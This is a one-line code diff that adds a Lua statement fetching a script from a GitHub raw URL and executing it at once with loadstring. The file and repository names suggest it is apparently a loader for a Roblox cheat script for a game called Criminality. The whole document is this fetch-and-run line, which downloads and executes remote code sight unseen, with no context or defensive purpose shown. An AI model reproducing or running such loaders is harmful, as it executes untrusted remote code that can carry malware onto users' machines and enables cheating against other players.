@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/criminality-spam0-gpg6jx0hfiwmx7.lua"))()
